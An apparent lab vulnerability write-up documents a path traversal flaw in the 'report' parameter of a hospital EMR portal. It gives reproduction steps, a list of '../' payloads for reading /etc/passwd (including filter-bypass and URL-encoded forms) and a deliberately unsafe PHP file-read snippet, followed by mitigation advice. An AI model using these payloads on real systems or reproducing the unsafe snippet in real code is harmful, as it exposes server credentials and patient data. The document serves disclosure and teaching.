# Local File Inclusion (LFI) / Path Traversal - Hospital EMR Portal

## Summary

I identified a Local File Inclusion (LFI) / Path Traversal vulnerability in the `report` parameter of the Hospital EMR (Electronic Medical Record) Portal.

The application accepts user-controlled input through the `report` parameter and uses it to read files from the server without proper validation or sanitization. By injecting path traversal sequences (`../`), an attacker can read sensitive files outside the intended directory, including system configuration files like `/etc/passwd`.

An attacker can craft a malicious URL that reads arbitrary files from the server, potentially leading to information disclosure, credential theft, or further exploitation.

## Vulnerability Type

**Local File Inclusion (LFI) / Path Traversal**

## Vulnerable Parameters

```text
section
report
```

## Vulnerable URL

```text
https://kzlabs.in/subdomains/hospital/?section=dashboard&report=5
```

## Steps to Reproduce

1. Navigate to the vulnerable Hospital EMR portal at `https://kzlabs.in/subdomains/hospital/`.

2. Replace the value of the `report` parameter with a path traversal payload:

   ```text
   ../../../../../../../../etc/passwd
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/subdomains/hospital/?section=dashboard&report=../../../../../../../../etc/passwd
   ```

4. Observe that the application reads and displays the contents of `/etc/passwd` in the response.

5. The output reveals system user accounts, including the `root` user.

## Payloads Used

```text
/etc/passwd
../../../../../../../../etc/passwd
....//....//....//....//....//....//....//etc/passwd
```

URL-encoded versions:
```text
%2Fetc%2Fpasswd
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

## Proof of Concept

```php

$report = $_GET['report'];
echo file_get_contents($report);
```

## Impact

An attacker can:

- Read sensitive system files (`/etc/passwd`, `/etc/shadow`, `/etc/hosts`)
- Read application configuration files (database credentials, API keys)
- Read application source code
- Extract sensitive patient data (PHI/PII) from the EMR system
- Enumerate system users and services
- Potentially achieve Remote Code Execution (RCE) by reading log files or combining with other vulnerabilities
- Bypass authentication by reading session files or configuration

Given this is a Hospital EMR portal, the impact is particularly severe as it could lead to exposure of protected health information (PHI), violating HIPAA and other healthcare regulations.

## Recommendation

To mitigate this vulnerability:

- **Avoid User-Controlled Paths**: Do not use user input directly to determine file paths.

- **Use a Whitelist**: Only allow specific, pre-approved reports to be accessed.
  ```php
  $allowed_reports = [1, 2, 3, 4, 5];
  $report = (int)$_GET['report'];
  if (!in_array($report, $allowed_reports)) {
      die("Report not allowed.");
  }
  $path = "/var/www/hospital/reports/" . $report;
  ```

- **Validate Input**: Ensure the input is numeric if the parameter expects an ID.
  ```php
  $report = (int)$_GET['report'];
  $path = "/var/www/hospital/reports/" . $report;
  ```

- **Use Realpath**: Resolve the real path and verify it's within the intended directory.
  ```php
  $base_dir = '/var/www/hospital/reports/';
  $real_path = realpath($base_dir . $_GET['report']);
  if (strpos($real_path, $base_dir) !== 0) {
      die("Invalid file path.");
  }
  ```

- **Disable `allow_url_include`**: Prevent remote file inclusion in `php.ini`.
  ```ini
  allow_url_include = Off
  allow_url_fopen = Off
  ```

- **Chroot Jail**: Restrict the web server to a specific directory.

- **Principle of Least Privilege**: Run the web server with minimal permissions.

- **Web Application Firewall (WAF)**: Deploy a WAF to detect and block path traversal payloads.

- **Regular Security Audits**: Conduct regular assessments to identify vulnerabilities.

- **HIPAA Compliance**: Ensure all access to patient data is logged and audited.
